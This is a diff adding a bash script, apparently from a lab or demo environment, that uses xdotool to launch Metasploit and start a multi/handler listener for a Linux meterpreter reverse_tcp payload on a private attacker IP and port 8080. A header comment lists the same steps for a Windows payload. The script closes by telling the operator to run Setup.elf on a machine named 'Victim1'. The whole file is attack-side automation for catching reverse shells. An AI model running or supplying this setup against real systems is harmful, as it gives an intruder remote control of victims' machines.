@@ -1,0 +1,33 @@
+#!/bin/bash
+###############################
+# Script to start the Reverse Shell on the Attacker
+# The commands using metasploit for the Reverse Shells are
+# msfconsole                                  <--- start metasploit
+# use exploit/multi/handler                   <--- configure reverse shell for Windows
+# set payload windows/meterpreter/reverse_tcp
+# set LHOST 192.168.110.191                   <--- IP of the attacker for reverseshell
+# set LPORT 8080                              <--- PORT of the attacker for reverseshell
+# exploit -j -z                               <--- start reverse shell
+###############################
+xdotool getwindowfocus > /tmp/script_window
+echo "Wait for the end of ReverseShell Attacker Preparation script..."
+xdotool key ctrl+alt+t
+sleep 1
+xdotool getwindowfocus > /tmp/attack_window
+xdotool windowsize `cat /tmp/attack_window` 800 400
+xdotool windowmove `cat /tmp/attack_window` 480 150
+xdotool type --window `cat /tmp/attack_window` --delay 100 "msfconsole"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 14
+xdotool type --window `cat /tmp/attack_window` --delay 200 "use exploit/multi/handler"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set payload linux/x64/meterpreter/reverse_tcp"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set LHOST 192.168.100.5"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "set LPORT 8080"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 1
+xdotool type --window `cat /tmp/attack_window` --delay 100 "exploit -j -z"; xdotool key --window `cat /tmp/attack_window` Return
+sleep 2
+xdotool windowactivate `cat /tmp/script_window`
+echo "ReverseShell Attacker Preparation ready..."
+echo "Run Setup.elf on Victim1 linux-vdi"
